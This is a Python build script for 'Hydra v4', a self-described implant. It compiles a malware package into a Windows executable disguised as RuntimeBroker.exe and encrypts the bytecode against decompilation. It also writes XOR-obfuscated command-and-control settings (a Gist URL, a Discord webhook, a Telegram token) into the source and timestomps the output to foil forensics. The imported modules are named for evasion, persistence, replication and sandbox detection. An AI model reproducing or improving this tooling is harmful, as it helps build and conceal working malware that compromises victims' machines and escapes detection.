#!/usr/bin/env python3
"""
Hydra v4 — Build script.
Compiles the implant with PyInstaller, UPX-packs it, and writes
XOR-encoded secrets into core.py before building.

Usage:
    python build.py              # stealth mode (default)
    python build.py --profile dev
    python build.py --profile demo
    python build.py --clean      # remove build artifacts
"""
import os
import sys
import time
import shutil
import subprocess
import base64
import hashlib


# ═══════════════════════════════════════════════════════
# CONFIG — Edit these before building!
# ═══════════════════════════════════════════════════════

# ═══ Secrets (loaded from gitignored secrets.json at build time) ════
# Copy secrets.example.json → secrets.json and fill in real values.
# NEVER commit secrets.json!

import json as _json
SECRETS_FILE = os.path.join(os.path.dirname(__file__), "secrets.json")
REAL_CONFIG = {
    "gist_url": "https://gist.githubusercontent.com/PLACEHOLDER/raw/c2.txt",
    "discord_webhook": "https://discord.com/api/webhooks/PLACEHOLDER",
    "c2_key": "hydra_c2_key_v4",
    "tg_token": "",
}

if os.path.exists(SECRETS_FILE):
    with open(SECRETS_FILE) as f:
        loaded = _json.load(f)
        REAL_CONFIG.update(loaded)
else:
    print("[!] secrets.json not found — building with placeholder C2 URLs")
    print("[*] Copy secrets.example.json → secrets.json and fill in real values")

# Build profiles
PROFILES = {
    "dev": {
        "name": "hydra_dev.exe",
        "console": True,
        "upx": False,
        "onefile": True,
        "hidden_imports": ["hydra", "hydra.core", "hydra.sandbox", "hydra.evasion",
                          "hydra.c2", "hydra.persistence", "hydra.recon",
                          "hydra.replication", "hydra.watchdog", "hydra.modules",
                          "hydra.opsec"],
    },
    "stealth": {
        "name": "RuntimeBroker.exe",
        "console": False,
        "strip": True,
        "onefile": True,
        "upx": False,  # DISABLED — UPX attracts AV, not evades it
        "hidden_imports": ["hydra", "hydra.core", "hydra.sandbox", "hydra.evasion",
                          "hydra.c2", "hydra.persistence", "hydra.recon",
                          "hydra.replication", "hydra.watchdog", "hydra.modules",
                          "hydra.opsec"],
    },
    "demo": {
        "name": "hydra_demo.exe",
        "console": True,
        "upx": False,
        "onefile": True,
        "hidden_imports": ["hydra", "hydra.core", "hydra.sandbox", "hydra.evasion",
                          "hydra.c2", "hydra.persistence", "hydra.recon",
                          "hydra.replication", "hydra.watchdog", "hydra.modules",
                          "hydra.opsec"],
    },
}


# ═══ XOR Utils ════════════════════════════════════════

def _xor_key():
    return bytes([0x5E, 0x3F, 0xA1, 0x77, 0x12, 0x8C, 0x4B, 0xE9,
                   0x6D, 0x2A, 0xF3, 0x55, 0x1C, 0x9E, 0x7F, 0xD0])


def xor_encode(text):
    data = text.encode() if isinstance(text, str) else text
    key = _xor_key() * (len(data) // len(_xor_key()) + 1)
    result = bytes(a ^ b for a, b in zip(data, key[:len(data)]))
    # Format as Python bytes literal
    return str(result)[2:-1]  # strip b'...'


# ═══ Build ════════════════════════════════════════════

def build(profile="stealth"):
    print(f"[*] Building Hydra v4 — profile: {profile}")

    cfg = PROFILES.get(profile, PROFILES["stealth"])
    dist_dir = os.path.join(os.path.dirname(__file__), "dist")
    build_dir = os.path.join(os.path.dirname(__file__), "build")
    os.makedirs(dist_dir, exist_ok=True)

    # ── Step 1: Check deps ──
    if not _check_pyinstaller():
        print("[!] PyInstaller not found. Install: uv pip install pyinstaller")
        return False

    if cfg.get("upx") and not _check_upx():
        print("[!] UPX not found. Install: winget install upx")
        print("[*] Continuing without compression...")
        cfg["upx"] = False

    # ── Step 2: Encode secrets ──
    print("[*] Encoding secrets into core.py...")
    _encode_secrets()

    # ── Step 3: Build with PyInstaller ──
    print("[*] Running PyInstaller...")
    pyinstaller_cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile" if cfg.get("onefile") else "--onedir",
        "--name", cfg["name"].replace(".exe", ""),
        "--distpath", dist_dir,
        "--workpath", build_dir,
        "--specpath", build_dir,
        "--noconfirm",
        "--clean",
    ]

    if not cfg.get("console"):
        pyinstaller_cmd.append("--windowed")

    if cfg.get("strip"):
        pyinstaller_cmd.extend(["--strip"])

    # Encrypt bytecode so uncompyle6 can't extract source
    pyinstaller_encrypt_key = os.environ.get(
        "HYDRA_ENCRYPT_KEY",
        f"hydra_v4_{str(int(time.time()))[-6:]}"
    )
    pyinstaller_cmd.extend(["--key", pyinstaller_encrypt_key])

    if cfg.get("upx"):
        pyinstaller_cmd.extend(["--upx-dir", _find_upx_dir()])

    for imp in cfg.get("hidden_imports", []):
        pyinstaller_cmd.extend(["--hidden-import", imp])

    # Add the hydra package data
    hydra_dir = os.path.join(os.path.dirname(__file__), "hydra")
    pyinstaller_cmd.extend(["--add-data", f"{hydra_dir}{os.pathsep}hydra"])

    # Entry point
    entry = os.path.join(os.path.dirname(__file__), "entry.py")
    pyinstaller_cmd.append(entry)

    # Run PyInstaller
    try:
        result = subprocess.run(pyinstaller_cmd, cwd=os.path.dirname(__file__),
                               capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[!] PyInstaller failed:\n{result.stderr[-500:]}")
            return False
        print("[+] PyInstaller complete")
    except Exception as e:
        print(f"[!] PyInstaller error: {e}")
        return False

    # ── Step 4: Verify output ──
    exe_path = os.path.join(dist_dir, cfg["name"])
    if not os.path.exists(exe_path):
        print(f"[!] Build output not found: {exe_path}")
        return False

    size_mb = os.path.getsize(exe_path) / (1024 * 1024)
    print(f"[+] Output: {exe_path} ({size_mb:.1f} MB)")

    # ── Step 5: Hash for reference ──
    with open(exe_path, "rb") as f:
        sha = hashlib.sha256(f.read()).hexdigest()
    print(f"[+] SHA256: {sha[:16]}...")

    # ── Step 6: Timestomp the built exe ──
    print("[*] Timestomping...")
    _timestomp(exe_path)

    # ── Step 7: Restore core.py from backup ──
    core_backup = os.path.join(os.path.dirname(__file__), "hydra", "core.py.bak")
    core_original = os.path.join(os.path.dirname(__file__), "hydra", "core.py")
    if os.path.exists(core_backup):
        shutil.copy(core_backup, core_original)
        print("[*] Restored core.py from backup")

    print(f"\n[+] BUILD COMPLETE: {exe_path}")
    return True


def _check_pyinstaller():
    try:
        result = subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
                               capture_output=True, text=True, timeout=5)
        ver = result.stdout.strip().split("\n")[0]
        print(f"[*] PyInstaller: {ver}")
        return True
    except:
        return False


def _check_upx():
    try:
        result = subprocess.run(["upx", "--version"], capture_output=True, text=True, timeout=5)
        ver = result.stdout.strip()
        print(f"[*] UPX: {ver}")
        return True
    except:
        return False


def _find_upx_dir():
    """Find UPX installation directory."""
    candidates = [
        r"C:\Program Files\upx",
        r"C:\Program Files (x86)\upx",
        os.path.expanduser("~\\scoop\\apps\\upx\\current"),
    ]
    for c in candidates:
        if os.path.isdir(c):
            return c
    # Try PATH
    try:
        result = subprocess.run(["where", "upx"], capture_output=True, text=True, timeout=5)
        upx_path = result.stdout.strip().split("\n")[0]
        return os.path.dirname(upx_path)
    except:
        return "."


def _encode_secrets():
    """Patch core.py with XOR-encoded real secrets."""
    core_path = os.path.join(os.path.dirname(__file__), "hydra", "core.py")

    # Read current core.py
    with open(core_path, "r") as f:
        content = f.read()

    # Backup original
    shutil.copy(core_path, core_path + ".bak")

    # Replace Gist URL
    encoded_gist = xor_encode(REAL_CONFIG["gist_url"])
    # Find the GIST_URL line and replace the encoded bytes
    import re

    # Replace GIST_URL
    content = re.sub(
        r"GIST_URL = _d\(b'[^']*'\)",
        f"GIST_URL = _d(b'{encoded_gist}')",
        content
    )

    # Get TG token from env
    tg_token = os.environ.get("TG_BOT_TOKEN", REAL_CONFIG.get("tg_token", ""))
    if tg_token and tg_token != "***":
        encoded_tg = xor_encode(tg_token)
        content = re.sub(
            r"TG_TOKEN = _d\(b'[^']*'\)",
            f"TG_TOKEN = _d(b'{encoded_tg}')",
            content
        )

    # Replace Discord webhook
    encoded_webhook = xor_encode(REAL_CONFIG["discord_webhook"])
    content = re.sub(
        r"DISCORD_WEBHOOK = _d\(b'[^']*'\)",
        f"DISCORD_WEBHOOK = _d(b'{encoded_webhook}')",
        content
    )

    # Replace C2 key
    encoded_key = xor_encode(REAL_CONFIG["c2_key"])
    content = re.sub(
        r"C2_KEY = _d\(b'[^']*'\)",
        f"C2_KEY = _d(b'{encoded_key}')",
        content
    )

    with open(core_path, "w") as f:
        f.write(content)

    print("[+] Secrets encoded in core.py")


def _timestomp(path):
    """Set file dates to January 15, 2024."""
    try:
        import ctypes
        # 2024-01-15 12:00:00 as FILETIME
        import datetime
        dt = datetime.datetime(2024, 1, 15, 12, 0, 0)
        epoch = datetime.datetime(1601, 1, 1)
        ft = int((dt - epoch).total_seconds() * 10_000_000)

        handle = ctypes.windll.kernel32.CreateFileW(
            path, 0x40000000, 0, None, 3, 0x02000000, None
        )
        if handle != -1:
            ft_val = ctypes.c_ulonglong(ft)
            ctypes.windll.kernel32.SetFileTime(
                handle, ctypes.byref(ft_val), ctypes.byref(ft_val), ctypes.byref(ft_val)
            )
            ctypes.windll.kernel32.CloseHandle(handle)
    except:
        pass


def clean():
    """Remove build artifacts."""
    paths = ["build", "dist", "__pycache__"]
    base = os.path.dirname(__file__)
    for p in paths:
        full = os.path.join(base, p)
        if os.path.exists(full):
            shutil.rmtree(full)
            print(f"[-] Removed: {full}")

    # Restore core.py backup
    core = os.path.join(base, "hydra", "core.py")
    backup = core + ".bak"
    if os.path.exists(backup):
        shutil.copy(backup, core)
        os.remove(backup)
        print("[*] Restored core.py")

    print("[+] Clean complete")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Hydra v4 build system")
    parser.add_argument("--profile", choices=["dev", "stealth", "demo"],
                       default="stealth", help="Build profile")
    parser.add_argument("--clean", action="store_true",
                       help="Remove build artifacts")
    args = parser.parse_args()

    if args.clean:
        clean()
    else:
        build(args.profile)
